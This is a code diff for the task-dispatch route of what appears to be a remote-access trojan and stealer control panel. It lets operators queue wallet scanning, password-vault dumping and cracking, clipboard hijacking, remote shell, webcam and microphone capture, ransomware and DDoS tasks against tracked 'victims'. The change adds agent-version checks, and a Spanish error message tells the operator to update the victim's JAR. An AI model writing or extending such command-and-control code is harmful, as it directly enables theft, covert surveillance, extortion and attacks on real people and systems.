@@ -10,6 +10,17 @@ import { taskLinkError } from '../lib/tasks';
 import { validateParams } from '../lib/task-schemas';
 import { dispatchCommand, hasControl } from './ws';
 
+function compareVersion(value: string | null | undefined, min: string): number {
+  const parse = (input: string) => input.split('.').map((part) => Number.parseInt(part, 10) || 0);
+  const left = parse(value ?? '0');
+  const right = parse(min);
+  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
+    const diff = (left[index] ?? 0) - (right[index] ?? 0);
+    if (diff !== 0) return diff;
+  }
+  return 0;
+}
+
 const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
@@ -66,13 +77,22 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
 
   app.post('/tasks', { preHandler: requireRole('operator') }, async (request, reply) => {
     const input = enqueueSchema.parse(request.body);
-    const invalid = validateParams(input.name, input.params);
-    if (invalid) throw bad('invalid_params', invalid, 422);
     const victims = await prisma.victim.findMany({
       where: { id: { in: input.victim_ids }, revokedAt: null },
-      select: { id: true, hostname: true, discord: { select: { channelId: true, missingAt: true } } }
+      select: { id: true, hostname: true, agentVersion: true, discord: { select: { channelId: true, missingAt: true } } }
     });
     if (victims.length === 0) throw bad('no_victims', 'no live victim in selection');
+    // Older agents reject parameters and tasks introduced in 0.3.7. Degrade
+    // instead of failing the whole batch: harvest without `kind` still works.
+    const staleAgent = (min: string) => victims.some((victim) => compareVersion(victim.agentVersion, min) < 0);
+    if (input.name === 'harvest' && 'kind' in input.params && staleAgent('0.3.7')) {
+      delete (input.params as Record<string, unknown>).kind;
+    }
+    if ((input.name === 'webcam' || input.name === 'mic') && staleAgent('0.3.7')) {
+      throw bad('agent_old', `${input.name} requiere agente 0.3.7; actualiza el JAR de la víctima`, 409);
+    }
+    const invalid = validateParams(input.name, input.params);
+    if (invalid) throw bad('invalid_params', invalid, 422);
     const notBefore = input.not_before ? new Date(input.not_before) : new Date();
     const due = notBefore.getTime() <= Date.now();
     const online = new Set(victims.filter((victim) => hasControl(victim.id)).map((victim) => victim.id));
